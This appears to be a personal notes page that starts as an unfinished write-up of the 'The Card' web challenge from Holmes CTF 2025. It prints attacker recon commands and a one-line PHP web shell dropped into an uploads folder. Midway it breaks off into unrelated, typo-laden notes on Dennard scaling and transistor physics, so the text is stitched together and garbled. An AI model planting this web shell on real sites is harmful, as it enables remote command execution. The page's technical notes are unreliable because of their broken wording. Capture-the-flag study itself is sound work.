---
title: the_card
parent: holmes_ctf_2025
---

## The Card

- **CTF name**: Holmes CTF 2025 After Party
- **Challenge name**: The Card
- **Challenge description**: Holmes receives a breadcrumb from Dr. Nicole Vale - fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital calling card signed JM.
- **Challenge category**: web
- **Challenge points** : 1800
Given waf.log (web application firewall), application and access logs.
Logs show victim,  Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 was attacked.
Seems attacker requested some backup tar, and sql dump, and upload configurations, and that allowed it to get access to 

```
ls -la /var/www/html
find /var/www -name "*.sql" -o -name "*.tar.gz" -o -name "*.bck"
echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/uploads/temp_4A4D.php
```

Using BurpSuite


Dennard Scaling
Scale transistor dimensinos and oeprating voltage by a factor lambda
Gate delay scles as lambda

Clock frequency scales as 1/delay

Energy per signal transistions cales as lambda^3
POwer is energy over time. Power scaes as lambda^2
Number of devices on a chip scsales as lambda ^-2

Power density, watts per centimer is constant

Conclusion: everything gets way better as we shrink transistors

precise manufacturing

-> we cant just keep lowering volatage, transistor in off state creates energy barrier for electrons moving from source to drain

Must be many times larger than random thermal energy, or transistor will leak
Operating voltage must be around 0.6 volts or more

Chips are faster than they should be  by Dennard scaling, but way hotter

Electrons can quantum tunnel through glass seperating transsitor

Make glass from hafnium oxide

Gate doesnt control electric field in trnasistor strongly enough
- wrap gtae around channel, FinFETs, Gate ALL Around FETs
- 
Transistor is tool small for doping to work righ, There arent enough aoms


Scaling:



Better than silicon:
- Chiplets - many smaller chhips on single ceramic, M series CPU, GPUS
- Stacking memeory chips
- Liquid nitrogren? Silicon photonics


Lasers and glass fibre, optical interoconncet is better at distances

 Encase/FTK/The Sleuth Kit/Volatility